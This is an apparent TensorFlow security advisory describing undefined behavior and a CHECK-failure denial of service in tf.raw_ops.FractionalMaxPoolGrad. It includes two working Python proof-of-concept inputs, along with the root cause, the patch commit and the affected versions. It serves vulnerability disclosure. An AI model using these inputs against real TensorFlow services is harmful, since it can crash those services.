summary: "Undefined behavior and `CHECK`-fail in `FractionalMaxPoolGrad`\n### Impact\nThe implementation\
  \ of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input\
  \ tensors is empty:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([2,\
  \ 3], shape=[1, 1, 1, 2], dtype=tf.int64)\norig_output = tf.constant([], dtype=tf.int64) \n\
  out_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([0],\
  \ shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\n\
  \ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n\
  \  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence,\
  \ overlapping=False)\n```\n\nThe code is also vulnerable to a denial of service attack as\
  \ a `CHECK` condition becomes false and aborts the process\n\n```python\nimport tensorflow\
  \ as tf\n\norig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1],\
  \ shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\n\
  row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence\
  \ = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input,\
  \ orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n\
  \  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/169054888d50ce488dfde9ca55d91d6325efbd5b/tensorflow/core/kernels/fractional_max_pool_op.cc#L215)\
  \ fails to validate that input and output tensors are not empty and are of the same rank.\
  \ Each of these unchecked assumptions is responsible for the above issues.\n\n### Patches\n\
  We have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).\n\
  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow\
  \ 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected\
  \ and still in supported range.\n\n### For more information\nPlease consult [our security\
  \ guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information\
  \ regarding the security model and how to contact us with issues and questions.\n\n### Attribution\n\
  This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
